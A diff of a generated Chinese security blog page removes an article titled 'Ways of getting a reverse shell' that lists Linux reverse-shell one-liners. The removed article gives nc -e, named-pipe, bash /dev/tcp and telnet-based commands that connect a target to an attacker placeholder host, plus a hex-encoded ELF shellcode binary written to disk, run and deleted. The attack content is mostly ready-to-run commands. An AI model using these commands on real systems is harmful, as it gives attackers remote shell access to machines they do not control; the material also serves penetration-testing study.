 <li>Windows 平台用户态 API 监控与代码注入的检测<br><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565" target="_blank" rel="external">https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565</a></li>
@@ -1609,160 +1774,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/01/30/reverse-shell的几种方式/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="M0rk">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="M0rk's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/01/30/reverse-shell的几种方式/" itemprop="url">
-                  reverse shell的几种方式
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-30T15:58:01+08:00">
-                2018-01-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
-<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。</li>
-<li>linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。</li>
-<li>下文中的几个例子一般在大多数的系统中是通用的。</li>
-<li>这里主要重点关注一下4和5<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></li>
-<li>要求能够使用者能够在目标机器上运行一些基本的命令。<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
-<li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
-<ul>
-<li>现在的netcat版本可能没有-e参数。<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
-<li>那么可以使用下面的命令</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt;	# A</div></pre></td></tr></table></figure>
-<p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p>
-<h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
-<ul>
-<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
-<p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p>
-<ul>
-<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
-<p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
-<ul>
-<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li>
-<li>这里的shellcode可以使用msf生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -v -l 1337             # Attacker</div><div class="line">echo -e &quot;\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; &gt; c; chmod +x c;./c &amp; rm c  # Target</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
-<li>这里只是一些小技巧，我希望在我们遇到比如某些命令在某个系统中不能使用的时候，或许我们可以发现并使用其它的方式，可以达到同样的效果，而不是在一棵树上吊死<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4></li>
-<li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="external">Spawning reverse shells</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1812,7 +1823,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">163</span>
+                <span class="site-state-item-count">164</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
